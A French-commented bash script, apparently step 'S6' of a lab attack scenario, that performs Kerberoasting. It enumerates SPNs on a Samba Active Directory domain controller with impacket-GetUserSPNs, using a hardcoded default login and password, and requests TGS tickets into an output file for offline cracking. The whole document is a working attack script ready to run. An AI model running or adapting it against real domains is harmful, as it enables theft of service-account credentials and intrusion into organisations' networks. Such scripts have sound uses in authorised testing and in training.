#!/usr/bin/env bash
# S6 — Kerberoasting : énumération SPN + demande de tickets TGS
# Cible : Samba AD DC srv-pme.nyx.tg (10.0.1.20)
#
# Usage :
#   ./kerberoast.sh                    # creds par défaut dir1:Nyx2026!
#   DOMAIN=nyx.tg AUTH_USER=dir1 AUTH_PASS='xxx' ./kerberoast.sh

set -euo pipefail

DOMAIN="${DOMAIN:-nyx.tg}"
DC_IP="${DC_IP:-10.0.1.20}"
AUTH_USER="${AUTH_USER:-dir1}"
AUTH_PASS="${AUTH_PASS:-Nyx2026!}"
OUTDIR="${OUTDIR:-./logs}"
OUTFILE="${OUTFILE:-${OUTDIR}/kerberoast_tgs.txt}"

mkdir -p "${OUTDIR}"

echo "=== S6 — Kerberoasting (GetUserSPNs) ==="
echo "  Cible  : ${DC_IP} (${DOMAIN})"
echo "  User   : ${AUTH_USER}"
echo "  Output : ${OUTFILE}"
echo ""

impacket-GetUserSPNs \
    "${DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
    -dc-ip "${DC_IP}" \
    -request \
    -outputfile "${OUTFILE}"

echo ""
echo "=== Terminé ==="
echo "TGS tickets sauvegardés dans ${OUTFILE}"
wc -l "${OUTFILE}" 2>/dev/null || echo "(fichier vide — aucun SPN dans l'AD ?)"
